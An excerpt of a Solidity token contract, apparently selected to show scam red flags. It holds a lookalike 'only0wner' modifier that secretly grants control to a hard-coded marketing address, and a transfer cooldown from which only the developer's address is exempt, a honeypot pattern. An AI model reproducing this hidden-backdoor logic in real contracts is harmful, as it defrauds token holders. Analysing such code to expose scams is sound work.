...
contract Ownable is Context {
    ...
    modifier only0wner() {
        require(_marketingAddress == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual only0wner {
...
contract test is Context, IERC20, Ownable {
    ...
    string private constant _name = "tes";
    string private constant _symbol = "TESTS";
    uint8 private constant _decimals = 9;
    mapping(address => uint256) _lastTransferTime;
    ...
    address payable private _developmentAddress = payable(0xe04d1Ed84dCDF3cda3db693D1606C85C7EF81e39); 
    address payable private _marketingAddress = payable(0xe04d1Ed84dCDF3cda3db693D1606C85C7EF81e39);
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
   ...
   function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
    ...
    address sender = _msgSender();
    if(_msgSender() != _developmentAddress || address(uniswapV2Pair) == address(0)) {
        require(block.timestamp - _lastTransferTime[sender] >= 300);
    }
